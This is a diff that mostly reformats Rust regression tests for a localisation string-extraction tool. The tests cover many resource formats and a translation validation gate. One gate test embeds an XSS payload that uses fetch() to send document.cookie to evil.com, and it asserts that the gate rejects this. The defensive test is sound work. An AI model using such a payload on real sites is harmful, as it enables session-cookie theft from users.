@@ -11,15 +11,15 @@
 
 use glossa::emitters::resource;
 use glossa::engine::gate::ApeironNullGate;
+use glossa::ir::term::ApeironTerm;
 use glossa::parsers::code::extract_code_strings;
 use glossa::parsers::jsx::extract_jsx;
 use glossa::parsers::resource::{
-    extract_android_xml, extract_flutter_arb, extract_fluent, extract_ios_strings,
-    extract_json, extract_po, extract_properties, extract_xliff, extract_yaml,
+    extract_android_xml, extract_fluent, extract_flutter_arb, extract_ios_strings, extract_json,
+    extract_po, extract_properties, extract_xliff, extract_yaml,
 };
 use glossa::parsers::svelte::extract_svelte;
 use glossa::parsers::vue::extract_vue;
-use glossa::ir::term::ApeironTerm;
 use std::collections::BTreeMap;
 
 // =========================================================================
@@ -195,8 +195,12 @@ fn test_regression_solid_and_astro() {
 
     let items = extract_code_strings(astro_source, "index.astro");
     assert!(!items.is_empty());
-    assert!(items.iter().any(|i| i.canonical_text == "Welcome to Sovereign Cloud"));
-    assert!(items.iter().any(|i| i.canonical_text == "High Performance Microkernels"));
+    assert!(items
+        .iter()
+        .any(|i| i.canonical_text == "Welcome to Sovereign Cloud"));
+    assert!(items
+        .iter()
+        .any(|i| i.canonical_text == "High Performance Microkernels"));
 }
 
 // =========================================================================
@@ -219,8 +223,12 @@ fn test_regression_python_django_fastapi() {
 
     let items = extract_code_strings(py_source, "auth_service.py");
     assert_eq!(items.len(), 3);
-    assert!(items.iter().any(|i| i.canonical_text.contains("Account has been temporarily suspended")));
-    assert!(items.iter().any(|i| i.canonical_text.contains("{username}")));
+    assert!(items.iter().any(|i| i
+        .canonical_text
+        .contains("Account has been temporarily suspended")));
+    assert!(items
+        .iter()
+        .any(|i| i.canonical_text.contains("{username}")));
 }
 
 // =========================================================================
@@ -248,8 +256,12 @@ fn test_regression_go_i18n() {
     "#;
 
     let items = extract_code_strings(go_source, "cluster.go");
-    assert!(items.iter().any(|i| i.canonical_text == "Node synchronized successfully"));
-    assert!(items.iter().any(|i| i.canonical_text == "Connection timeout to master broker"));
+    assert!(items
+        .iter()
+        .any(|i| i.canonical_text == "Node synchronized successfully"));
+    assert!(items
+        .iter()
+        .any(|i| i.canonical_text == "Connection timeout to master broker"));
 }
 
 // =========================================================================
@@ -266,8 +278,12 @@ fn test_regression_rails_and_laravel() {
     end
     "#;
     let rb_items = extract_code_strings(rb_source, "subscriptions_controller.rb");
-    assert!(rb_items.iter().any(|i| i.canonical_text == "subscription.cancelled_successfully"));
-    assert!(rb_items.iter().any(|i| i.canonical_text == "Your access will remain active until end of period"));
+    assert!(rb_items
+        .iter()
+        .any(|i| i.canonical_text == "subscription.cancelled_successfully"));
+    assert!(rb_items
+        .iter()
+        .any(|i| i.canonical_text == "Your access will remain active until end of period"));
 
     let php_source = r#"
     <?php
@@ -282,8 +298,12 @@ fn test_regression_rails_and_laravel() {
     }
     "#;
     let php_items = extract_code_strings(php_source, "AuthController.php");
-    assert!(php_items.iter().any(|i| i.canonical_text == "Invalid credentials provided. Please check your password."));
-    assert!(php_items.iter().any(|i| i.canonical_text == "auth.password_reset_sent"));
+    assert!(php_items
+        .iter()
+        .any(|i| i.canonical_text == "Invalid credentials provided. Please check your password."));
+    assert!(php_items
+        .iter()
+        .any(|i| i.canonical_text == "auth.password_reset_sent"));
 }
 
 // =========================================================================
@@ -304,8 +324,12 @@ fn test_regression_apple_ios() {
     }
     "#;
     let swift_items = extract_code_strings(swift_source, "SettingsView.swift");
-    assert!(swift_items.iter().any(|i| i.canonical_text == "Privacy Settings"));
-    assert!(swift_items.iter().any(|i| i.canonical_text == "Manage your encryption keys and certificates"));
+    assert!(swift_items
+        .iter()
+        .any(|i| i.canonical_text == "Privacy Settings"));
+    assert!(swift_items
+        .iter()
+        .any(|i| i.canonical_text == "Manage your encryption keys and certificates"));
 
     let strings_file = r#"
     /* Privacy Settings Header */
@@ -314,8 +338,13 @@ fn test_regression_apple_ios() {
     "#;
     let strings_items = extract_ios_strings(strings_file, "Localizable.strings");
     assert_eq!(strings_items.len(), 2);
-    assert!(strings_items.iter().any(|i| i.key.as_deref() == Some("privacy_header")));
-    let cert_item = strings_items.iter().find(|i| i.key.as_deref() == Some("cert_count")).unwrap();
+    assert!(strings_items
+        .iter()
+        .any(|i| i.key.as_deref() == Some("privacy_header")));
+    let cert_item = strings_items
+        .iter()
+        .find(|i| i.key.as_deref() == Some("cert_count"))
+        .unwrap();
     assert!(cert_item.canonical_text.contains("{var}"));
 }
 
@@ -336,7 +365,9 @@ fn test_regression_android_xml() {
     let items = extract_android_xml(xml_source, "res/values/strings.xml");
     assert_eq!(items.len(), 3);
     assert!(items.iter().any(|i| i.key.as_deref() == Some("app_name")));
-    assert!(items.iter().any(|i| i.canonical_text == "Apeiron Kernel Monitor"));
+    assert!(items
+        .iter()
+        .any(|i| i.canonical_text == "Apeiron Kernel Monitor"));
 }
 
 /// Real fixture: verbatim lines from `mendhak/gpslogger`'s actual
@@ -362,17 +393,38 @@ fn test_regression_android_xml_real_world_numeric_entities() {
     let items = extract_android_xml(xml_source, "res/values/strings.xml");
     assert_eq!(items.len(), 5);
 
-    let foot = items.iter().find(|i| i.key.as_deref() == Some("foot")).unwrap();
-    assert_eq!(foot.canonical_text, "\u{00A0}foot", "must decode &#160; to an actual non-breaking space, not keep the literal text");
+    let foot = items
+        .iter()
+        .find(|i| i.key.as_deref() == Some("foot"))
+        .unwrap();
+    assert_eq!(
+        foot.canonical_text, "\u{00A0}foot",
+        "must decode &#160; to an actual non-breaking space, not keep the literal text"
+    );
 
-    let half = items.iter().find(|i| i.key.as_deref() == Some("time_halfminute")).unwrap();
-    assert_eq!(half.canonical_text, "\u{00BD} minute", "must decode &#189; to the actual ½ character");
+    let half = items
+        .iter()
+        .find(|i| i.key.as_deref() == Some("time_halfminute"))
+        .unwrap();
+    assert_eq!(
+        half.canonical_text, "\u{00BD} minute",
+        "must decode &#189; to the actual ½ character"
+    );
 
-    let mixed = items.iter().find(|i| i.key.as_deref() == Some("time_oneandhalfhours")).unwrap();
+    let mixed = items
+        .iter()
+        .find(|i| i.key.as_deref() == Some("time_oneandhalfhours"))
+        .unwrap();
     assert_eq!(mixed.canonical_text, "1\u{00BD} hours");
 
-    let degree = items.iter().find(|i| i.key.as_deref() == Some("degree_symbol")).unwrap();
-    assert_eq!(degree.canonical_text, "\u{00B0}", "must decode &#176; to the actual degree sign");
+    let degree = items
+        .iter()
+        .find(|i| i.key.as_deref() == Some("degree_symbol"))
+        .unwrap();
+    assert_eq!(
+        degree.canonical_text, "\u{00B0}",
+        "must decode &#176; to the actual degree sign"
+    );
 }
 
 /// Confirms named XML entities (not present in the gpslogger fixture above,
@@ -390,17 +442,29 @@ fn test_regression_android_xml_named_entities_and_malformed_fallback() {
     "#;
 
     let items = extract_android_xml(xml_source, "res/values/strings.xml");
-    let terms = items.iter().find(|i| i.key.as_deref() == Some("terms")).unwrap();
+    let terms = items
+        .iter()
+        .find(|i| i.key.as_deref() == Some("terms"))
+        .unwrap();
     assert_eq!(terms.canonical_text, "Terms & Conditions");
 
-    let compare = items.iter().find(|i| i.key.as_deref() == Some("compare")).unwrap();
+    let compare = items
+        .iter()
+        .find(|i| i.key.as_deref() == Some("compare"))
+        .unwrap();
     assert_eq!(compare.canonical_text, "5 < 10 > 3");
 
     // "&amp Handling" (no trailing semicolon before the next word) is not a
     // well-formed entity — the '&' must survive as a literal character
     // rather than the decoder eating "amp Handling" looking for a ';'.
-    let malformed = items.iter().find(|i| i.key.as_deref() == Some("not_an_entity")).unwrap();
-    assert!(malformed.canonical_text.contains('&'), "malformed entity must fall back to a literal '&', not silently drop text");
+    let malformed = items
+        .iter()
+        .find(|i| i.key.as_deref() == Some("not_an_entity"))
+        .unwrap();
+    assert!(
+        malformed.canonical_text.contains('&'),
+        "malformed entity must fall back to a literal '&', not silently drop text"
+    );
 }
 
 // =========================================================================
@@ -433,21 +497,39 @@ fn test_regression_inlang_message_reference_real_world_appflowy() {
 
     let items = extract_json(json, "translations/en-US.json");
 
-    let welcome = items.iter().find(|i| i.key.as_deref() == Some("welcomeText")).unwrap();
+    let welcome = items
+        .iter()
+        .find(|i| i.key.as_deref() == Some("welcomeText"))
+        .unwrap();
     assert!(
-        welcome.terms.iter().any(|t| matches!(t, ApeironTerm::Slot { name, .. } if name == "appName")),
+        welcome
+            .terms
+            .iter()
+            .any(|t| matches!(t, ApeironTerm::Slot { name, .. } if name == "appName")),
         "`@:appName` must become a Slot term, not get flattened into plain translatable text"
     );
 
-    let signup = items.iter().find(|i| i.key.as_deref() == Some("signUp.title")).unwrap();
-    assert!(signup.terms.iter().any(|t| matches!(t, ApeironTerm::Slot { name, .. } if name == "appName")));
+    let signup = items
+        .iter()
+        .find(|i| i.key.as_deref() == Some("signUp.title"))
+        .unwrap();
+    assert!(signup
+        .terms
+        .iter()
+        .any(|t| matches!(t, ApeironTerm::Slot { name, .. } if name == "appName")));
 
     // Dotted-path reference (@:chat.changeFormat.text) must be captured whole,
     // not truncated at the first '.' the way a bare identifier scan might.
-    let nested_ref = items.iter().find(|i| i.key.as_deref() == Some("chat.textWithImageDescription")).unwrap();
+    let nested_ref = items
+        .iter()
+        .find(|i| i.key.as_deref() == Some("chat.textWithImageDescription"))
+        .unwrap();
     assert!(
-        nested_ref.terms.iter().any(|t| matches!(t, ApeironTerm::Slot { name, .. } if name == "chat.changeFormat.text")),
-        "dotted-path message reference must be captured in full: {:?}", nested_ref.terms
+        nested_ref.terms.iter().any(
+            |t| matches!(t, ApeironTerm::Slot { name, .. } if name == "chat.changeFormat.text")
+        ),
+        "dotted-path message reference must be captured in full: {:?}",
+        nested_ref.terms
     );
 }
 
@@ -473,8 +555,13 @@ fn test_regression_flutter_arb() {
 
     let items = extract_flutter_arb(arb_source, "intl_en.arb");
     assert_eq!(items.len(), 2);
-    assert!(items.iter().any(|i| i.key.as_deref() == Some("pageTitle") && i.canonical_text == "Device Telemetry"));
-    let battery = items.iter().find(|i| i.key.as_deref() == Some("batteryStatus")).unwrap();
+    assert!(items
+        .iter()
+        .any(|i| i.key.as_deref() == Some("pageTitle") && i.canonical_text == "Device Telemetry"));
+    let battery = items
+        .iter()
+        .find(|i| i.key.as_deref() == Some("batteryStatus"))
+        .unwrap();
     assert!(battery.canonical_text.contains("{percentage}"));
     assert!(battery.canonical_text.contains("{temp}"));
 }
@@ -493,7 +580,9 @@ fn test_regression_catalogs_multi_format() {
     "#;
     let yaml_items = extract_yaml(yaml_source, "config/locales/en.yml");
     assert_eq!(yaml_items.len(), 2);
-    assert!(yaml_items.iter().any(|i| i.key.as_deref() == Some("production.alerts.node_offline")));
+    assert!(yaml_items
+        .iter()
+        .any(|i| i.key.as_deref() == Some("production.alerts.node_offline")));
 
     // Properties
     let prop_source = r#"
@@ -503,7 +592,9 @@ fn test_regression_catalogs_multi_format() {
     "#;
     let prop_items = extract_properties(prop_source, "system.properties");
     assert_eq!(prop_items.len(), 2);
-    assert!(prop_items.iter().any(|i| i.canonical_text.contains("{host}")));
+    assert!(prop_items
+        .iter()
+        .any(|i| i.canonical_text.contains("{host}")));
 
     // XLIFF 1.2
     let xlf_source = r#"
@@ -532,7 +623,10 @@ fn test_regression_catalogs_multi_format() {
     "#;
     let po_items = extract_po(po_source, "en.po");
     assert_eq!(po_items.len(), 1);
-    assert_eq!(po_items[0].canonical_text, "Two-factor authentication required");
+    assert_eq!(
+        po_items[0].canonical_text,
+        "Two-factor authentication required"
+    );
 
     // Fluent
     let ftl_source = r#"
@@ -550,19 +644,26 @@ fn test_regression_catalogs_multi_format() {
 fn test_regression_roundtrip_emitters() {
     let mut catalog = BTreeMap::new();
     catalog.insert("greeting".to_string(), "Hello, {name}!".to_string());
-    catalog.insert("footer.terms".to_string(), "All rights reserved.".to_string());
+    catalog.insert(
+        "footer.terms".to_string(),
+        "All rights reserved.".to_string(),
+    );
 
     // JSON Roundtrip
     let json_str = resource::emit_json(&catalog);
     let extracted_json = extract_json(&json_str, "virtual.json");
     assert_eq!(extracted_json.len(), 2);
-    assert!(extracted_json.iter().any(|i| i.canonical_text == "Hello, {name}!"));
+    assert!(extracted_json
+        .iter()
+        .any(|i| i.canonical_text == "Hello, {name}!"));
 
     // YAML Roundtrip
     let yaml_str = resource::emit_yaml(&catalog, "en");
     let extracted_yaml = extract_yaml(&yaml_str, "virtual.yml");
     assert_eq!(extracted_yaml.len(), 2);
-    assert!(extracted_yaml.iter().any(|i| i.canonical_text == "Hello, {name}!"));
+    assert!(extracted_yaml
+        .iter()
+        .any(|i| i.canonical_text == "Hello, {name}!"));
 
     // PO Roundtrip
     let po_str = resource::emit_po(&catalog, "en");
@@ -592,10 +693,14 @@ fn test_regression_null_gate_and_glossary() {
     // Corrupted brand term (e.g. LLM translated "Apeiron" into "Infini")
     let bad_trans = "Propulsé par Ptyktos sur l'architecture Infini.";
     let err = ApeironNullGate::validate_with_glossary(src, bad_trans, Some(&glossary)).unwrap_err();
-    assert!(matches!(err, glossa::engine::gate::GateViolation::GlossaryViolation { .. }));
+    assert!(matches!(
+        err,
+        glossa::engine::gate::GateViolation::GlossaryViolation { .. }
+    ));
 
     // 2. Adversarial XSS Attack caught
-    let xss_trans = "¡Bienvenido!<script>fetch('http://evil.com/leak?cookie='+document.cookie)</script>";
+    let xss_trans =
+        "¡Bienvenido!<script>fetch('http://evil.com/leak?cookie='+document.cookie)</script>";
     assert!(ApeironNullGate::validate("Welcome!", xss_trans).is_err());
 
     // 3. Mismatched tag order caught
